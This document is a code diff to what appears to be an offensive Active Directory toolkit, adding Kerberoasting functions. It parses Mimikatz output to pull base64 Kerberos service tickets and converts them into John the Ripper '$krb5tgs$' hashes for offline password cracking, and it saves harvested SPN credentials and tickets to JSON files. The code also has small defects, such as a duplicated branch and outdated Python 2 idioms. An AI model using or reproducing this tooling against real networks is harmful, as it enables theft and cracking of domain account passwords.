@@ -28,6 +28,8 @@ import glob
 from multiprocessing import Process
 import socket
 import ssl
+from pyasn1.codec.ber import encoder, decoder
+from multiprocessing import JoinableQueue, Manager
 
 # LIBS
 from lib.global_data import *
@@ -319,4 +321,82 @@ def store_credentials():
     f = open('data/credentials.json', 'w')
     f.write(json.dumps(gdata.credentials))
     f.close()
+
+# STORE CREDENTIALS_SPN AS JSON (data/credentials_spn.json)
+def store_credentials_spn():    
+    f = open('data/credentials_spn.json', 'w')
+    f.write(json.dumps(gdata.credentials_spn))
+    f.close()
+
+# STORE CREDENTIALS_SPN AS JSON (data/credentials_spn.json)
+def store_credentials_ticket():    
+    f = open('data/credentials_ticket.json', 'w')
+    f.write(json.dumps(gdata.credentials_ticket))
+    f.close()
+
+# -----------------------
+# KERBEROST
+# -----------------------
+def mimikatz2kirbi(data):
+    separator = "===================="
+    counter = 0
+    b64 = ""
+    output = ""
+    
+    lines = data.split("\n")
+    
+    for line in lines:
+        if "Base64 of file : " in line:
+            filename = line.replace("Base64 of file : ","")
+            counter = 0
+            b64 = ""
+        
+        elif "Server Name" in line:
+            server_name = line.split(":")[1].strip().split("@")[0].strip()
+        
+        elif "Server Name" in line:
+            server_name = line.split(":")[1].strip().split("@")[0].strip()
+        
+        elif line == separator:
+            counter += 1
+
+        elif counter == 1 and line != separator:
+            b64 += line
+        
+        elif counter == 2:
+            counter = 0
+            #output += server_name + "|"
+            #output += kirbi2john(base64.b64decode(b64), filename) + "\n"
+            output += kirbi2john(base64.b64decode(b64), server_name) + "\n"
+        
+    return output
+                
+def kirbi2john(data, filename):
+    # Based on the Kerberoast script from Tim Medin to extract the Kerberos tickets
+    # from a kirbi file.
+    # Modification to parse them into the JTR-format by Michael Kramer (SySS GmbH)
+    # Copyright [2015] [Tim Medin, Michael Kramer]
+    #
+    # Licensed under the Apache License, Version 2.0 (the "License");
+    # you may not use this file except in compliance with the License.
+    # You may obtain a copy of the License at
+    #
+    #    http://www.apache.org/licenses/LICENSE-2.0
+    #
+    # Unless required by applicable law or agreed to in writing, software
+    # distributed under the License is distributed on an "AS IS" BASIS,
+    # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+    # See the License for the specific language governing permissions and
+    # limitations under the License
+    
+    manager = Manager()
+    enctickets = manager.list()
+
+    if data[0] == '\x76':
+        et = (str(decoder.decode(data)[0][2][0][3][2]),0,filename)
+    elif data[:2] == '6d':
+        for ticket in data.strip().split('\n'):
+            et = (str(decoder.decode(ticket.decode('hex'))[0][4][3][2]),0,filename)
+
+    return "$krb5tgs$" + et[2] + ":"+et[0][:16].encode("hex")+"$"+et[0][16:].encode("hex")
 
